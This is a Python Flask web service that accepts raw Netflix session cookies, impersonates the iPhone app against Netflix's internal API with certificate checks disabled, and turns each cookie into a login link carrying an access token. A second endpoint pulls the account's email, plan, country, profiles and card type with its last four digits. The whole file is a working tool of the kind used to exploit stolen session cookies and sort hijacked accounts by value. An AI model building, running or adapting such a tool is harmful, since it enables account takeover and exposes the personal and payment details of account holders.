import requests
import os
import re
import json
import urllib.parse
from datetime import datetime
from flask import Flask, request, jsonify
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

app = Flask(__name__)

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
CHECK_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

CHECK_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","membershipStatus","userInfo","countryOfSignup","memberSince","currentMembership","userBillingInfo","profiles","emailVerified"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")

COUNTRY_FLAGS = {
    "US": "🇺🇸", "IN": "🇮🇳", "GB": "🇬🇧", "CA": "🇨🇦", "AU": "🇦🇺",
    "DE": "🇩🇪", "FR": "🇫🇷", "IT": "🇮🇹", "ES": "🇪🇸", "BR": "🇧🇷",
    "MX": "🇲🇽", "JP": "🇯🇵", "KR": "🇰🇷", "NL": "🇳🇱", "SE": "🇸🇪",
    "NO": "🇳🇴", "DK": "🇩🇰", "FI": "🇫🇮", "PL": "🇵🇱", "TR": "🇹🇷",
    "AR": "🇦🇷", "CO": "🇨🇴", "CL": "🇨🇱", "PH": "🇵🇭", "ID": "🇮🇩",
    "TH": "🇹🇭", "MY": "🇲🇾", "SG": "🇸🇬", "PK": "🇵🇰", "BD": "🇧🇩",
    "NG": "🇳🇬", "ZA": "🇿🇦", "EG": "🇪🇬", "SA": "🇸🇦", "AE": "🇦🇪",
    "PT": "🇵🇹", "RO": "🇷🇴", "CZ": "🇨🇿", "HU": "🇭🇺", "GR": "🇬🇷",
}

def decode_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except:
            return value
    return value

def extract_cookie_dict(text):
    cookie_dict = {}
    try:
        data = json.loads(text)
        if isinstance(data, list):
            for c in data:
                if c.get("name") in COOKIE_KEYS:
                    cookie_dict[c["name"]] = decode_value(c.get("value", ""))
        elif isinstance(data, dict):
            for key in COOKIE_KEYS:
                if key in data:
                    cookie_dict[key] = decode_value(data[key])
    except:
        pass
    for key in COOKIE_KEYS:
        if key not in cookie_dict:
            match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
            if match:
                cookie_dict[key] = decode_value(match.group(1))
    return cookie_dict

def fetch_nftoken(cookie_dict):
    netflix_id = cookie_dict.get("NetflixId")
    if not netflix_id:
        raise ValueError("Missing NetflixId in cookie")
    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    response = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=30, verify=False)
    response.raise_for_status()
    data = response.json()
    token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
    token = token_data.get("token")
    expires = token_data.get("expires")
    if not token:
        raise ValueError("No token found in response")
    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000
    return token, expires

def fetch_account_info(cookie_dict):
    netflix_id = cookie_dict.get("NetflixId")
    secure_id = cookie_dict.get("SecureNetflixId", "")
    if not netflix_id:
        raise ValueError("Missing NetflixId in cookie")
    headers = dict(BASE_HEADERS)
    cookie_str = f"NetflixId={netflix_id}"
    if secure_id:
        cookie_str += f"; SecureNetflixId={secure_id}"
    headers["Cookie"] = cookie_str
    response = requests.get(CHECK_URL, params=CHECK_PARAMS, headers=headers, timeout=30, verify=False)
    response.raise_for_status()
    return response.json()

def format_expiry(expires):
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
    except:
        return str(expires)

def get_flag(country_code):
    return COUNTRY_FLAGS.get(country_code.upper(), "🌍") if country_code else "🌍"

@app.route("/withdraw", methods=["GET"])
def withdraw():
    cookie_raw = request.args.get("cookie", "")
    if not cookie_raw:
        return jsonify({"error": "No cookie provided"}), 400
    try:
        cookie_dict = extract_cookie_dict(cookie_raw)
        token, expires = fetch_nftoken(cookie_dict)
        login_url = "https://netflix.com/?nftoken=" + token
        expiry = format_expiry(expires)
        return jsonify({"url": login_url, "expires": expiry, "token": str(token)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/check", methods=["GET"])
def check():
    cookie_raw = request.args.get("cookie", "")
    if not cookie_raw:
        return jsonify({"error": "No cookie provided"}), 400
    try:
        cookie_dict = extract_cookie_dict(cookie_raw)
        data = fetch_account_info(cookie_dict)
        token, expires = fetch_nftoken(cookie_dict)

        print("RAW DATA:", json.dumps(data, indent=2))

        account = (data.get("value") or {}).get("account") or {}

        # Status
        membership = account.get("membershipStatus") or {}
        status_raw = membership.get("status", "") if isinstance(membership, dict) else str(membership)
        is_active = "✅ Active" if "CURRENT" in str(status_raw) else "❌ Expired"

        # Country
        country = account.get("countryOfSignup", "")
        if not country:
            country = (account.get("userInfo") or {}).get("countryOfSignup", "")
        flag = get_flag(country) if country else "🌍"
        country_str = f"{flag} {country}" if country else "🌍 Unknown"

        # Member since
        member_since = account.get("memberSince", "")
        if isinstance(member_since, int):
            member_since = datetime.fromtimestamp(member_since/1000).strftime("%d %b %Y")
        elif not member_since:
            member_since = "Unknown"

        # Plan
        current = account.get("currentMembership") or {}
        plan_name = current.get("planName", "") or current.get("videoQuality", "") or "Unknown"

        # Payment
        billing = account.get("userBillingInfo") or {}
        payment_method = billing.get("paymentMethod") or {}
        card_type = payment_method.get("cardType", "")
        last4 = payment_method.get("last4Digits", "")
        if card_type and last4:
            payment_info = f"{card_type} - {last4}"
        elif payment_method.get("paymentType"):
            payment_info = payment_method.get("paymentType")
        else:
            payment_info = "Unknown"

        # Profiles
        profiles_data = account.get("profiles") or {}
        profiles_list = []
        if isinstance(profiles_data, dict):
            for k, v in profiles_data.items():
                if isinstance(v, dict):
                    name = v.get("profileName", "")
                    if name:
                        profiles_list.append(name)
        profiles_str = ", ".join(profiles_list) if profiles_list else "Unknown"

        # Email
        user_info = account.get("userInfo") or {}
        email = user_info.get("userLogin", "Unknown")
        email_verified = "✅ Verified" if user_info.get("emailVerified") else "❌ Not Verified"

        # Extra members
        extra_members = current.get("extraMemberCount", 0)
        extra_str = f"Yes ✅ ({extra_members})" if extra_members and extra_members > 0 else "No ❌"

        return jsonify({
            "status": is_active,
            "country": country_str,
            "member_since": member_since,
            "plan": plan_name,
            "payment": payment_info,
            "profiles": profiles_str,
            "email": email,
            "email_verified": email_verified,
            "extra_members": extra_str,
            "token": str(token),
            "expires": format_expiry(expires),
            "raw": account
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
